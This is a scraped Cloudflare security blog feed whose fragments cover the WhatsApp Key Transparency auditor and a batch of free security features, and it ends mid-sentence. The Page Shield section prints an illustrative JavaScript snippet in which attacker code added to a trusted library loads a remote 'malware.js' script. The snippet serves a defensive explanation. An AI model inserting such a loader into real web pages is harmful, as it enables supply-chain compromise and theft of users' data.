          &lt;p&gt;The architectural foundation of Key Transparency is the &lt;a href="https://github.com/facebook/akd/"&gt;&lt;u&gt;Auditable Key Directory (AKD)&lt;/u&gt;&lt;/a&gt;: a tree-shaped data structure, constructed and maintained by WhatsApp, in which the nodes contain hashed contact details of each user. We’ll explain the basics here but if you’re interested in learning more, check out the &lt;a href="https://eprint.iacr.org/2018/607.pdf"&gt;&lt;u&gt;SEEMless&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://eprint.iacr.org/2023/081.pdf"&gt;&lt;u&gt;Parakeet&lt;/u&gt;&lt;/a&gt; papers.&lt;/p&gt;&lt;p&gt;The AKD tree is constructed by building a binary tree, each parent node of which is a hash of each of its left and right child nodes:&lt;/p&gt;
            &lt;figure&gt;
            
            &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5Dl16PIqBNBiKn6qhzanCU/b67a1128bef4ab8733337f720c53f160/Mini_tree_-_Blog.png" /&gt;
            
            &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Each child node on the tree contains contact and public key details for a user (shown here for illustrative purposes). In reality, Cloudflare only sees a hash of each node rather than Alice and Bob’s contact info in plaintext.&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;An epoch describes a specific version of the tree at a given moment in time, identified by its root node. Using a structure similar to Code Verify, the WhatsApp Log stores each root node hash as part of an append-only time structure of updates.&lt;/p&gt;
            &lt;figure&gt;
            
            &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/43FGTWfTV2aIaaMkfyplY2/8576b9c096bead64ede52a034481149b/Key_Transparency_combined_tree_-_Blog.png" /&gt;
            
            &lt;/figure&gt;&lt;p&gt;What kind of changes are valid to be included in a given epoch? When a new person, Brian, joins WhatsApp, WhatsApp inserts a new “B” node in the AKD tree, and a new epoch. If Alice loses her phone and rotates her key, her “version” is updated to &lt;code&gt;v1&lt;/code&gt; in the next update.  &lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;How we built the Auditor on Cloudflare Workers &lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#how-we-built-the-auditor-on-cloudflare-workers"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;The role of the Auditor is to provide two main guarantees: that epochs are globally unique, and that they are valid. They are, however, quite different: global uniqueness requires consistency on whether an epoch and its associated root hash has been seen, while validity is a matter of computation — is the transition from the previous epoch to the current one a correct tree transformation?&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Timestamping service&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#timestamping-service"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        
            &lt;figure&gt;
            
            &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5QHtfUaKoIBcIcK5o6H53j/ebaa147f3b22de32a29754d3cd7e73bd/Key_Transparency_Auditor_3_.png" /&gt;
            
            &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Timestamping service architecture (Cloudflare Workers in Rust, using a Durable Object for storage)&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;At regular intervals, the WhatsApp Log puts all new updates into the tree, and cuts a new epoch in the format “{counter}/{previous}/{current}”. The counter is a number, whereby “previous” is a hexadecimal encoded hash of the previous tree root, and “current” is a hexadecimal encoded hash for the new tree root. As a shorthand, epochs can be referred to by their counter only.&lt;/p&gt;&lt;p&gt;Here’s an example:&lt;/p&gt;&lt;p&gt;&lt;code&gt;1001/d0bbf29c48716f26a951ae2a244eb1d070ee38865c29c8ad8174e8904e3cdc1a/e1006114485e8f0bbe2464e0ebac77af37bce76851745592e8dd5991ff2cd411&lt;/code&gt;&lt;/p&gt;&lt;p&gt;Once an epoch is constructed, the WhatsApp Log sends it to the Auditor for cross-signing, to ensure it has only been seen once. The Auditor adds a timestamp as to when this new epoch has been seen. Cloudflare’s Auditor uses a &lt;a href="https://developers.cloudflare.com/durable-objects/platform/known-issues/#global-uniqueness"&gt;&lt;u&gt;Durable Object&lt;/u&gt;&lt;/a&gt; for every epoch to create their timestamp. This guarantees the global uniqueness of an epoch, and the possibility of replay in the event the WhatsApp Log experiences an outage or is distributed across multiple locations. WhatsApp’s Log is expected to produce new epochs at regular intervals, given this constrains the propagation of public key updates seen by their users. Therefore, Cloudflare Auditor does not have to keep the durable object state forever. Once replay and consistency have been accounted for, this state is cleared. This is done after a month, thanks to durable object &lt;a href="https://developers.cloudflare.com/durable-objects/api/alarms/"&gt;&lt;u&gt;alarms&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;Additional checks are performed by the service, such as checking that the epochs are consecutive, or that their digest is unique. This enforces a chain of epochs and their associated digests, provided by the WhatsApp Log and signed by the Auditor, providing a consistent view for all to see.&lt;/p&gt;&lt;p&gt;We decided to write this service in Rust because Workers rely on &lt;a href="https://github.com/cloudflare/workers-rs"&gt;&lt;u&gt;cloudflare/workers-rs&lt;/u&gt;&lt;/a&gt; bindings, and the auditable key directory library is also in Rust (&lt;a href="https://github.com/facebook/akd"&gt;&lt;u&gt;facebook/akd&lt;/u&gt;&lt;/a&gt;).&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Tree validation service&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#tree-validation-service"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;With the timestamping service above, WhatsApp users (as well as their Log) have assurance that epochs are transparent. WhatsApp’s directory can be audited at any point in time, and if it were to be tampered with by WhatsApp or an intermediary, the WhatsApp Log can be held accountable for it.&lt;/p&gt;&lt;p&gt;Epochs and their digests are only representations of their underlying key directory. To fully audit the directory, the transition from the previous digest to a current digest has to be validated. To perform validation, we need to run the epoch validation method. Specifically, we want to run &lt;a href="https://github.com/facebook/akd/blob/fcd665aa20f829cd9e06cb3d70cbe0c32ffe6b67/akd/src/auditor.rs#L56"&gt;&lt;u&gt;verify_consecutive_append_only&lt;/u&gt;&lt;/a&gt; on every epoch constructed by the Log. The size of an epoch varies with the number of updates it contains, and therefore the number of associated nodes in the tree to construct as well. While Workers are able to run such validation for a small number of updates, this is a compute-intensive task. Therefore, still leveraging the same Rust codebase, the Auditor leverages a container that only performs the tree construction and validation. The Auditor retrieves the updates for a given epoch, copies them into its own R2 bucket, and delegates the validation to a &lt;a href="https://github.com/cloudflare/workers-sdk/tree/main/packages/wrangler/src/cloudchamber"&gt;&lt;u&gt;container&lt;/u&gt;&lt;/a&gt; running on Cloudflare. Once validated, the epoch is marked as verified.&lt;/p&gt;
            &lt;figure&gt;
            
            &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5fNbebayPfLZPn4pEIoWpP/b8d2da4ac9867aeb44e9e1ff52405be9/Key_Transparency_Auditor_4_.png" /&gt;
            
            &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Architecture for Cloudflare’s Plexi Auditor. The proof verification and signatures stored do not contain personally identifiable information such as your phone number, public key, or other metadata tied to your WhatsApp account.&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;This decouples global uniqueness requirements and epoch validation, which happens at two distinct times. It allows the validation to take more time, and not be latency sensitive.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;How can I verify Cloudflare has signed an epoch?&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#how-can-i-verify-cloudflare-has-signed-an-epoch"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;Anyone can perform audit proof verification — &lt;a href="https://dash.key-transparency.cloudflare.com"&gt;&lt;u&gt;the proofs are publicly available&lt;/u&gt;&lt;/a&gt; — but Cloudflare will be doing so automatically and publicly to make the results accessible to all. Verify that Cloudflare’s signature matches WhatsApp’s by visiting our &lt;a href="https://dash.key-transparency.cloudflare.com"&gt;&lt;u&gt;Key Transparency website&lt;/u&gt;&lt;/a&gt;, or via our &lt;a href="https://github.com/cloudflare/plexi"&gt;&lt;u&gt;command line&lt;/u&gt;&lt;/a&gt; tool.&lt;/p&gt;&lt;p&gt;To use our command line tool, you’ll need to download the &lt;a href="https://github.com/cloudflare/plexi"&gt;&lt;u&gt;plexi&lt;/u&gt;&lt;/a&gt; client. It helps construct data structures which are used for signatures, and requires you to have git and cargo installed.&lt;/p&gt;
            &lt;pre&gt;&lt;code&gt;cargo install plexi&lt;/code&gt;&lt;/pre&gt;
            &lt;p&gt;With the client installed, let’s now check the audit proofs for WhatsApp namespace: &lt;code&gt;whatsapp.key-transparency.v1&lt;/code&gt;. Plexi Auditor is represented by one public key, which can verify and vouch for multiple Logs with their own dedicated “namespace.” To validate an epoch, such as epoch 458298 (the epoch at which the log decided to start sharing data), you can run the following command:&lt;/p&gt;
            &lt;pre&gt;&lt;code&gt;plexi audit --remote-url 'https://akd-auditor.cloudflare.com' --namespace 'whatsapp.key-transparency.v1' --long

  Signature verification: success
  Proof verification	: success&lt;/code&gt;&lt;/pre&gt;

            &lt;h2&gt;Interested in having Cloudflare audit your public key infrastructure?&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#interested-in-having-cloudflare-audit-your-public-key-infrastructure"&gt;

          &lt;/div&gt;
          &lt;p&gt;At the end of the day, security threats shouldn’t become usability problems — everyday messaging app users shouldn’t have to worry about whether the public keys of the people they’re talking to have been compromised. In the same way that &lt;a href="https://ct.cloudflare.com/"&gt;&lt;u&gt;certificate transparency&lt;/u&gt;&lt;/a&gt; is now built into the issuance and use of digital certificates to encrypt web traffic, we think that public key transparency and auditing should be built into end-to-end encrypted systems by default, so that users never have to do manual QR code verification again. &lt;/p&gt;&lt;p&gt;We built our auditing service to be general purpose, reliable, and fast, and WhatsApp’s Key Transparency is just the first of several use cases it will be used for – Cloudflare is interested in helping audit the delivery of code binaries and integrity of all types of end-to-end encrypted infrastructure.

We will use this site to publish both technical and executive-oriented information on the latest threat actor activity and tactics, as well as insights on emerging malware, vulnerabilities, and attacks.&lt;/p&gt;&lt;p&gt;We are also publishing two new pieces of threat intelligence, along with a promise for more. Head over to the &lt;a href="http://cloudflare.com/threat-intelligence/"&gt;&lt;u&gt;new website&lt;/u&gt;&lt;/a&gt; here to see the latest research, covering an advanced threat actor targeting regional organizations across South and East Asia, as well as the rise of double brokering freight fraud. Future research and data sets will also become available as a new&lt;a href="https://developers.cloudflare.com/security-center/indicator-feeds/"&gt; &lt;u&gt;Custom Indicator Feed&lt;/u&gt;&lt;/a&gt;&lt;u&gt; &lt;/u&gt;for customers.&lt;/p&gt;&lt;p&gt;&lt;a href="http://cloudflare.com/threat-intelligence/"&gt;&lt;u&gt;Subscribe&lt;/u&gt;&lt;/a&gt; to receive email notifications of future threat research.&lt;/p&gt;

        &lt;p&gt;Security Analytics gives you a security lens across &lt;b&gt;all&lt;/b&gt; of your HTTP traffic, not only mitigated requests, allowing you to focus on what matters most: traffic deemed malicious but potentially not mitigated. This means that, in addition to using Security Events to view security actions taken by our Application Security suite of products, you can use Security Analytics to review all of your traffic for anomalies or strange behavior and then use the insights gained to craft precise mitigation rules based on your specific traffic patterns. Starting today, we are making this lens available to customers across all plans.&lt;/p&gt;&lt;p&gt;Free and Pro plan users will now have access to &lt;a href="https://dash.cloudflare.com/?to=/:account/:zone/security/analytics"&gt;&lt;u&gt;a new dashboard&lt;/u&gt;&lt;/a&gt; for Security Analytics where you can view a high level overview of your traffic in the Traffic Analysis chart, including the ability to group and filter so that you can zero in on anomalies with ease. You can also see top statistics and filter across a variety of dimensions, including countries, source browsers, source operating systems, HTTP versions, SSL protocol version, cache status, and security actions.&lt;/p&gt;

Now, you can easily analyze the DNS queries to your domain(s), which can be useful for troubleshooting issues, detecting patterns and trends, or generating usage reports by applying powerful filters and breaking out DNS queries by source.&lt;/p&gt;&lt;p&gt;With the &lt;a href="https://blog.cloudflare.com/foundation-dns-launch"&gt;&lt;u&gt;launch of Foundation DNS&lt;/u&gt;&lt;/a&gt;, we introduced new DNS Analytics based on GraphQL, but these analytics were previously only available for zones using &lt;a href="https://developers.cloudflare.com/dns/foundation-dns/advanced-nameservers/"&gt;&lt;u&gt;advanced nameservers&lt;/u&gt;&lt;/a&gt;. However, due to the deep insight these analytics provide, we felt this feature was something we should make available to everyone. Starting today, the new DNS Analytics based on GraphQL can be accessed on every zone using Cloudflare’s Authoritative DNS service under Analytics in the DNS section.&lt;/p&gt;

        &lt;p&gt;&lt;a href="https://techreport.com/statistics/cybersecurity/password-reuse-statistics/"&gt;&lt;u&gt;65% of Internet users&lt;/u&gt;&lt;/a&gt; are vulnerable to account takeover (ATO) due to password reuse and the rising frequency of large data breaches. Helping build a better Internet involves making critical account protection easy and accessible for everyone.&lt;/p&gt;&lt;p&gt;Starting today, we’re providing robust account security that helps prevent credential stuffing and other ATO attacks to everyone for free — from individual users to large enterprises — making enhanced features like Leaked Credential Checks and ATO detections available at no cost. &lt;/p&gt;&lt;p&gt;These updates include automatic detection of logins, brute force attack prevention with minimal setup, and access to a comprehensive leaked credentials database of over 15 billion passwords which will contain leaked passwords from the &lt;a href="https://haveibeenpwned.com/"&gt;&lt;u&gt;Have I been Pwned (HIBP)&lt;/u&gt;&lt;/a&gt; service in addition to our own database. Customers can take action on the leaked credential requests through Cloudflare’s WAF features like &lt;a href="https://developers.cloudflare.com/waf/rate-limiting-rules"&gt;&lt;u&gt;Rate Limiting Rules&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://developers.cloudflare.com/waf/custom-rules/"&gt;&lt;u&gt;Custom Rules&lt;/u&gt;&lt;/a&gt;, or they can take action at the origin by enforcing &lt;a href="https://www.cloudflare.com/learning/access-management/what-is-multi-factor-authentication/"&gt;&lt;u&gt;multi-factor authentication (MFA)&lt;/u&gt;&lt;/a&gt; or requiring a password reset based on a header sent to the origin.&lt;/p&gt;&lt;p&gt;Setup is simple: Free plan users get automatic detections, while paid users can activate the new features via one click in the Cloudflare dashboard. For more details on setup and configuration, refer to our &lt;a href="https://developers.cloudflare.com/waf/detections/leaked-credentials/"&gt;&lt;u&gt;documentation&lt;/u&gt;&lt;/a&gt; and use it today!&lt;/p&gt;

            &lt;h3&gt;API schema validation&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#api-schema-validation"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;API traffic &lt;a href="https://www.cloudflare.com/2024-api-security-management-report/"&gt;&lt;u&gt;comprises more than half&lt;/u&gt;&lt;/a&gt; of the dynamic traffic on the Cloudflare network. The popularity of APIs has opened up a whole new &lt;a href="https://cyware.com/news/unprotected-database-belonging-to-justdial-exposes-personal-information-of-almost-100-million-users-1d5bb7a9"&gt;&lt;u&gt;set&lt;/u&gt;&lt;/a&gt; of &lt;a href="https://venturebeat.com/security/t-mobile-data-breach-shows-api-security-cant-be-ignored/"&gt;&lt;u&gt;attack&lt;/u&gt;&lt;/a&gt; &lt;a href="https://venturebeat.com/security/twitter-breach-api-attack/"&gt;&lt;u&gt;vectors&lt;/u&gt;&lt;/a&gt;. Cloudflare API Shield’s &lt;a href="https://developers.cloudflare.com/api-shield/security/schema-validation/"&gt;&lt;u&gt;Schema Validation&lt;/u&gt;&lt;/a&gt; is the first step to &lt;a href="https://blog.cloudflare.com/api-gateway/"&gt;&lt;u&gt;strengthen&lt;/u&gt;&lt;/a&gt; your API security in the face of these new threats.&lt;/p&gt;&lt;p&gt;Now for the first time, &lt;i&gt;any&lt;/i&gt; Cloudflare customer can use Schema Validation to ensure only valid requests to their API make it through to their origin.&lt;/p&gt;&lt;p&gt;This functionality stops accidental information disclosure due to bugs, stops developers from haphazardly exposing endpoints through a non-standard process, and automatically blocks zombie APIs as your API inventory is kept up-to-date as part of your CI/CD process.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/3PMaRYLTwff6D7sdXRysJ7/728deb51cbec996c6741c428639b6900/image2.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;We suggest you use Cloudflare’s &lt;a href="https://developers.cloudflare.com/api/operations/api-shield-schema-validation-post-schema"&gt;&lt;u&gt;API&lt;/u&gt;&lt;/a&gt; or Terraform &lt;a href="https://developers.cloudflare.com/api-shield/reference/terraform/"&gt;&lt;u&gt;provider&lt;/u&gt;&lt;/a&gt; to add endpoints to Cloudflare API Shield and update the schema after your code’s been released as part of your post-build CI/CD process. That way, API Shield becomes a go-to API inventory tool, and &lt;a href="https://developers.cloudflare.com/api-shield/security/schema-validation/"&gt;&lt;u&gt;Schema Validation&lt;/u&gt;&lt;/a&gt; will take care of requests towards your API that you aren’t expecting.&lt;/p&gt;&lt;p&gt;While APIs are all about integrating with third parties, sometimes integrations are done by loading libraries directly into your application. Next up, we’re helping secure more of the web by protecting users from malicious third party scripts that steal sensitive information from inputs on your pages.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Supply chain attack prevention&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#supply-chain-attack-prevention"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Modern web apps improve their users’ experiences and cut down on developer time through the use of third party JavaScript libraries. Because of its privileged access level to everything on the page, a compromised third party JavaScript library can surreptitiously &lt;a href="https://www.cloudflare.com/learning/security/what-is-data-exfiltration/"&gt;exfiltrate sensitive information&lt;/a&gt; to an attacker without the end user or site administrator realizing it’s happened.&lt;/p&gt;&lt;p&gt;To counter this threat, we introduced Page Shield &lt;a href="https://blog.cloudflare.com/introducing-page-shield/"&gt;&lt;u&gt;three years ago&lt;/u&gt;&lt;/a&gt;. We are now releasing Page Shield’s Script Monitor for free to all our users.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5b6sxHcCLgIAHfb6Qub6NR/ae2f22ed1d2126804a5bc6e333d64fed/image3.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;With &lt;a href="https://dash.cloudflare.com/?to=/:account/:zone/security/page-shield"&gt;&lt;u&gt;Script Monitor&lt;/u&gt;&lt;/a&gt;, you’ll see &lt;i&gt;all&lt;/i&gt; JavaScript assets loaded on the page, not just the ones your developers included. This visibility includes scripts dynamically loaded by other scripts! Once an attacker compromises the library, it is trivial to add a new malicious script without changing the context of the original HTML by instead including new code in the existing included JavaScript asset:&lt;/p&gt;
            &lt;pre&gt;&lt;code&gt;// Original library code (trusted)
function someLibraryFunction() {
    // useful functionality here
}

// Malicious code added by the attacker
let malScript = document.createElement('script');
malScript.src = 'https://example.com/malware.js';
document.body.appendChild(malScript);&lt;/code&gt;&lt;/pre&gt;
            &lt;p&gt;Script Monitor was essential when the &lt;a href="https://blog.cloudflare.com/polyfill-io-now-available-on-cdnjs-reduce-your-supply-chain-risk"&gt;&lt;u&gt;news broke of the pollyfill.io library&lt;/u&gt;&lt;/a&gt; changing ownership. Script Monitor users had immediate visibility to the scripts loaded on their sites and could quickly and easily understand if they were at risk.&lt;/p&gt;&lt;p&gt;We’re happy to extend visibility of these scripts to as much of the web as we can by releasing Script Monitor for all customers. Find out how you can get started &lt;a href="https://developers.cloudflare.com/page-shield/detection/monitor-connections-scripts/"&gt;&lt;u&gt;here in the docs&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;Existing users of Page Shield can immediately filter on the monitored data, knowing whether polyfill.io (or any other library) is used by their app. In addition, we &lt;a href="https://blog.cloudflare.com/automatically-replacing-polyfill-io-links-with-cloudflares-mirror-for-a-safer-internet/"&gt;&lt;u&gt;built a polyfill.io rewrite&lt;/u&gt;&lt;/a&gt; in response to the compromised service, which was automatically enabled for Free plans in June 2024.&lt;/p&gt;

            &lt;h3&gt;Turnstile as a Google Firebase extension &lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#turnstile-as-a-google-firebase-extension"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;We're excited to announce the &lt;a href="https://developers.cloudflare.com/turnstile/extensions/google-firebase/"&gt;&lt;u&gt;Cloudflare Turnstile App Check Provider for Google Firebase&lt;/u&gt;&lt;/a&gt;, which offers seamless integration without the need for manual setup. This new extension allows developers building mobile or web applications on Firebase to protect their projects from bots using Cloudflare’s CAPTCHA alternative. By leveraging Turnstile's bot detection and challenge capabilities, you can ensure that only authentic human visitors interact with your Firebase backend services, enhancing both security and user experience. Cloudflare Turnstile, a privacy-focused CAPTCHA alternative, differentiates between humans and bots without disrupting the user experience. Unlike traditional CAPTCHA solutions, which users often abandon, Turnstile operates invisibly and provides various modes to ensure frictionless user interactions.&lt;/p&gt;&lt;p&gt;The Firebase App Check extension for Turnstile is easy to integrate, allowing developers to quickly enhance app security with minimal setup. This extension is also free with unlimited usage with Turnstile’s free tier. By combining the strengths of Google Firebase's backend services and Cloudflare’s Turnstile, developers can offer a secure and seamless experience for their users. &lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Cloudflare One&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#cloudflare-one"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;&lt;a href="https://www.cloudflare.com/zero-trust/"&gt;&lt;u&gt;Cloudflare One&lt;/u&gt;&lt;/a&gt; is a comprehensive &lt;a href="https://www.cloudflare.com/learning/access-management/what-is-sase/"&gt;&lt;u&gt;Secure Access Service Edge (SASE)&lt;/u&gt;&lt;/a&gt; platform designed to protect and connect people, apps, devices, and networks across the Internet. It combines services such as Zero Trust Network Access (ZTNA), Secure Web Gateway (SWG), and more into a single solution. Cloudflare One can help everyone secure people and networks, manage access control, protect against cyber threats, safeguard their data, and improve the performance of network traffic by routing it through Cloudflare’s global network. It replaces traditional security measures by offering a cloud-based approach to secure and streamline access to corporate resources.&lt;/p&gt;&lt;p&gt;Everyone now has free access to four new products that have been added to Cloudflare One over the past two years:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;a href="https://www.cloudflare.com/learning/access-management/what-is-a-casb/"&gt;&lt;u&gt;Cloud Access Security Broker (CASB)&lt;/u&gt;&lt;/a&gt; for mitigating SaaS application risk&lt;i&gt;.&lt;/i&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href="https://www.cloudflare.com/learning/access-management/what-is-dlp/"&gt;&lt;u&gt;Data Loss Prevention (DLP)&lt;/u&gt;&lt;/a&gt; for protecting sensitive data from leaving your network and SaaS applications&lt;i&gt;.&lt;/i&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href="https://www.cloudflare.com/learning/performance/what-is-digital-experience-monitoring/"&gt;&lt;u&gt;Digital Experience Monitoring&lt;/u&gt;&lt;/a&gt; for seeing a user’s experience when they are on any network.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href="https://www.cloudflare.com/network-services/products/magic-network-monitoring/"&gt;&lt;u&gt;Magic Network Monitoring&lt;/u&gt;&lt;/a&gt; for seeing all the traffic that flows through your network&lt;i&gt;.&lt;/i&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;This is in addition to the existing network security products already in the Cloudflare One platform:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;a href="https://www.cloudflare.com/learning/access-management/what-is-ztna/"&gt;&lt;u&gt;Access&lt;/u&gt;&lt;/a&gt; for verifying users’ identity and only letting them use the applications they’re meant to be using.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href="https://www.cloudflare.com/learning/access-management/what-is-a-secure-web-gateway/"&gt;&lt;u&gt;Gateway&lt;/u&gt;&lt;/a&gt; for protecting network traffic that both goes out to the public Internet and into your private network.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href="https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/"&gt;&lt;u&gt;Cloudflare Tunnel&lt;/u&gt;&lt;/a&gt;, our app connectors, which includes both cloudflared and WARP Connector for connecting different applications, servers, and private networks to Cloudflare’s network.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href="https://developers.cloudflare.com/cloudflare-one/connections/connect-devices/warp/"&gt;&lt;u&gt;Cloudflare WARP&lt;/u&gt;&lt;/a&gt;, our device agent, for securely sending traffic from a laptop or mobile device to the Internet.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Anyone with a Cloudflare account will automatically receive 50 free seats across all of these products in their Cloudflare One organization. Visit our &lt;a href="https://www.cloudflare.com/plans/zero-trust-services/"&gt;&lt;u&gt;Zero Trust &amp;amp; SASE plans page&lt;/u&gt;&lt;/a&gt; for more information about our free products and to learn about our Pay-as-you-go and Contract plans for teams above 50 members.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Authenticating with Google&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#authenticating-with-google"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;The Cloudflare dashboard itself has become a vital resource that needs to be protected, and we spend a lot of time ensuring Cloudflare user accounts do not get compromised.&lt;/p&gt;&lt;p&gt;To do this, we have increased security by adding additional authentication methods including app-based two-factor authentication (2FA), passkeys, SSO, and Sign in with Apple. Today we’re adding the ability to sign up and sign in with a Google account.&lt;/p&gt;&lt;p&gt;Cloudflare supports several authentication workflows tailored to different use cases. While SSO and passkeys are the preferred and most secure methods of authentication, we believe that providing authentication factors that are stronger than passwords will fill a gap and raise overall average security for our users. Signing in with Google makes life easier for our users and prevents them from having to remember yet another password when they’re already browsing the web with a Google identity.&lt;/p&gt;&lt;p&gt;Sign in with Google is based on the &lt;a href="https://oauth.net/2/"&gt;&lt;u&gt;OAuth 2.0&lt;/u&gt;&lt;/a&gt; specification, and allows Google to securely share identifying information about a given identity while ensuring that it is Google providing this information, preventing any malicious entities from impersonating Google.&lt;/p&gt;&lt;p&gt;This means that we can delegate authentication to Google, preventing zero knowledge attacks directly on this Cloudflare identity.&lt;/p&gt;&lt;p&gt;Upon coming to the Cloudflare Sign In page, you will be presented with the button below. Clicking on it will allow you to register for Cloudflare, and once you are registered, it will allow you to sign in without typing in a password, using any existing protections you have set on your Google account.&lt;/p&gt;
            &lt;figure&gt;
            
            &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/6Sse03ivX432bBV01nfyUx/1ce8ace19aa3e4228735d1ca7bd3528c/Screenshot_2024-09-23_at_16.02.49.png" /&gt;
            
            &lt;/figure&gt;&lt;p&gt;With the launch of this capability, Cloudflare now uses its own Cloudflare Workers to provide an abstraction layer for &lt;a href="https://openid.net/developers/how-connect-works/"&gt;&lt;u&gt;OIDC&lt;/u&gt;&lt;/a&gt;-compatible identity providers (such as GitHub and Microsoft accounts), which means our users can expect to see more &lt;a href="https://www.cloudflare.com/learning/access-management/what-is-an-identity-provider/"&gt;&lt;u&gt;identity provider (IdP)&lt;/u&gt;&lt;/a&gt; connection support coming in the future.&lt;/p&gt;&lt;p&gt;At this time, only new customers signing up with Google will be able to sign in with their Google account, but we will be implementing this for more of our users going forward, with the ability to link/de-link social login providers, and we will be adding additional social login methods. Enterprise users with an established SSO setup will not be able to use this method at this time, and those with an established SSO setup based on Google Workspace will be forwarded to their SSO flow, as we consider how to streamline the Access and IdP policies that have been set up to lock down your Cloudflare environment.&lt;/p&gt;&lt;p&gt;If you are new to Cloudflare, and have a Google account, it is easier than ever to start using Cloudflare to protect your websites, build a new service, or try any of the other services that Cloudflare provides.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;A safer Internet&lt;/h2&gt;

            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;One of Cloudflare’s goals has always been to democratize cyber security tools, so everyone can provide content and connect to the Internet safely, even without the resources of large enterprise organizations.&lt;/p&gt;&lt;p&gt;We have decided to provide a large set of new features for free to all Cloudflare users, covering a wide range of security use cases, for web administrators, network administrators, and cyber security enthusiasts.&lt;/p&gt;&lt;p&gt;&lt;a href="https://dash.cloudflare.com/"&gt;&lt;u&gt;Log in to your Cloudflare account&lt;/u&gt;&lt;/a&gt; to start taking advantage of these announcements today. We love feedback on our &lt;a href="https://community.cloudflare.com/"&gt;&lt;u&gt;community forums&lt;/u&gt;&lt;/a&gt;, and we commit to improving both existing features and new features moving forward.&lt;/p&gt;

            &lt;h3&gt;A committed journey of privacy and security&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#a-committed-journey-of-privacy-and-security"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;In 2018, Cloudflare &lt;a href="https://blog.cloudflare.com/announcing-1111/"&gt;&lt;u&gt;announced 1.1.1.1&lt;/u&gt;&lt;/a&gt;, one of the fastest, privacy-first consumer DNS services. 1.1.1.1 was the first consumer product Cloudflare ever launched, focused on reaching a wider audience. This service was designed to be fast and private, and &lt;a href="https://developers.cloudflare.com/1.1.1.1/privacy/public-dns-resolver/"&gt;&lt;u&gt;does not retain&lt;/u&gt;&lt;/a&gt; information that would identify who is making a request.&lt;/p&gt;&lt;p&gt;In 2020, Cloudflare &lt;a href="https://blog.cloudflare.com/introducing-1-1-1-1-for-families"&gt;&lt;u&gt;announced 1.1.1.1 for Families&lt;/u&gt;&lt;/a&gt;, designed to add a layer of protection to our existing 1.1.1.1 public resolver. The intent behind this product was to provide consumers, namely families, the ability to add a security and adult content filter to block unsuspecting users from accessing specific sites when browsing the Internet.&lt;/p&gt;&lt;p&gt;Today, we are officially announcing that any ISP and equipment manufacturer can use 